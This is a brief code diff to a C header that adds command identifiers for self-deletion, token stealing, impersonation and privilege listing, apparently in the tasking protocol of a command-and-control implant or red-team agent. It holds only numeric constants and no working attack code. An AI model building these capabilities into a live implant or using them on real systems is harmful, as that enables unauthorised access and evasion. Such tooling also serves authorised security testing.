@@ -51,8 +51,17 @@
 #define COMMAND_EXEC_BOF_OUT    51
 #define COMMAND_EXEC_BOF_ASYNC  52
 
-#define COMMAND_JOB_LIST        60
-#define COMMAND_JOB_KILL        61
+#define COMMAND_SELFDEL             53
+#define COMMAND_TOKEN_STEAL         54
+#define COMMAND_TOKEN_IMPERSONATE   55
+#define COMMAND_TOKEN_MAKE          56
+#define COMMAND_TOKEN_LIST          57
+#define COMMAND_TOKEN_REMOVE        58
+#define COMMAND_TOKEN_PRIVS         59
+#define COMMAND_CONFIG              60
+
+#define COMMAND_JOB_LIST        70
+#define COMMAND_JOB_KILL        71
 
 // ─── Response codes ────────────────────────────────────────────────────────────
 
